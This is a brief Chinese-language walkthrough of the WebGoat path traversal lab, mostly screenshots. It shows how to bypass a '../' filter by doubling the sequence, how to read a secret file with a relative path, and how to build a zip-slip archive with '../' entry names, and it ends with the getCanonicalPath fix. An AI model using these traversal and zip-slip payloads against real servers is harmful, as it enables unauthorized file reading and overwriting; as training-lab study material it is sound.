---
title: "Path traversal"
weight: 7
bookToc: false
---

修改test参数

![](/data/image/security/exploit/webgoat/A3/path/image.png)

![](/data/image/security/exploit/webgoat/A3/path/image-1.png)

![](/data/image/security/exploit/webgoat/A3/path/image-2.png)

---

修复为移除`../`，双写
![](/data/image/security/exploit/webgoat/A3/path/image-3.png)

---

修复为忽略用户传的`full name`，对文件名进行修改

![](/data/image/security/exploit/webgoat/A3/path/image-4.png)

---

读文件

![](/data/image/security/exploit/webgoat/A3/path/image-5.png)

返回404会显示当前目录中的文件

![](/data/image/security/exploit/webgoat/A3/path/image-6.png)

最终找到路径，`/home/webgoat/.webgoat-2025.3/PathTraversal/cats/../../path-traversal-secret.jpg`

![](/data/image/security/exploit/webgoat/A3/path/image-7.png)

![](/data/image/security/exploit/webgoat/A3/path/image-8.png)

让提交当前webgoat登录用户名的sha512值

![](/data/image/security/exploit/webgoat/A3/path/image-9.png)

---

解压缩时存在路径的拼接

```bash
mkdir -p /home/webgoat/.webgoat-2025.3/PathTraversal/zqqqqq

cd /home/webgoat/.webgoat-2025.3/PathTraversal/zqqqqq

curl -o zqqqqq.jpg http://127.0.0.1:9090/WebWolf/images/wolf.png

zip profile.zip ../../../../../../../../home/webgoat/.webgoat-2025.3/PathTraversal/zqqqqq/zqqqqq.jpg

zipinfo profile.zip
Archive:  profile.zip
Zip file size: 6271 bytes, number of entries: 1
-rw-r--r--  3.0 unx     5953 bx stor 26-Jan-16 13:56 ../../../../../../../../home/webgoat/.webgoat-2025.3/PathTraversal/zqqqqq/zqqqqq.jpg
1 file, 5953 bytes uncompressed, 5953 bytes compressed:  0.0%
```

![](/data/image/security/exploit/webgoat/A3/path/image-10.png)

![](/data/image/security/exploit/webgoat/A3/path/image-11.png)

可以使用`getCanonicalPath`获得规范化后的绝对路径